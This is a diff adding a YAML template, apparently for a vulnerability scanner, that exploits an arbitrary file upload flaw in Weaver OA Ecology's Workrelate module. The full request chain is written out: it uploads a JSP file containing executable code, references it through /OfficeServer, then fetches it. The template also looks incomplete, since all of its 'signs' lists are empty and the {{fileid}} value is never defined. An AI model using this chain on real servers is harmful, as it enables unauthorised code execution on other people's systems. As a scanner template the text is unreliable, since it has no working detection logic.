@@ -1,0 +1,54 @@
+id: weaver-uploadoperation-file-upload
+brief:
+    title: Weaver OA Workrelate - Arbitary File Upload
+    by: SleepingBag945
+    level: critical
+    about: Ecology contains an arbitrary file upload vulnerability. An attacker can upload arbitrary files to the server, which in turn can be used to make the application execute file content as code, As a r...
+    label:
+        - ecology
+        - fileupload
+        - intrusive
+        - vuln
+moves:
+    - verb: POST
+      to:
+        - '{{BaseURL}}/workrelate/plan/util/uploaderOperate.jsp'
+      head:
+        Accept: '*/*'
+        Accept-Encoding: gzip
+        Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryVdb2RRl25PuaGhWj
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/71.0.3578.98 Safari/537.36
+      body: |-
+        ------WebKitFormBoundaryVdb2RRl25PuaGhWj
+        Content-Disposition: form-data; name="secId"
+
+        1
+        ------WebKitFormBoundaryVdb2RRl25PuaGhWj
+        Content-Disposition: form-data; name="Filedata"; filename="{{filename}}.jsp"
+
+        <%out.println("{{string}}");%>
+        ------WebKitFormBoundaryVdb2RRl25PuaGhWj
+        Content-Disposition: form-data; name="plandetailid"
+
+        1
+        ------WebKitFormBoundaryVdb2RRl25PuaGhWj--
+      signs: []
+    - verb: POST
+      to:
+        - '{{BaseURL}}/OfficeServer'
+      head:
+        Accept: '*/*'
+        Accept-Encoding: gzip
+        Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryVdb2RRl25PuaGhWj
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/71.0.3578.98 Safari/537.36
+      body: |-
+        ------WebKitFormBoundaryVdb2RRl25PuaGhWj
+        Content-Disposition: form-data; name="aaa"
+
+        {"OPTION":"INSERTIMAGE","isInsertImageNew":"1","imagefileid4pic":"{{fileid}}"}
+        ------WebKitFormBoundaryVdb2RRl25PuaGhWj--
+      signs: []
+    - verb: GET
+      to:
+        - '{{BaseURL}}/{{filename}}.jsp'
+      signs: []
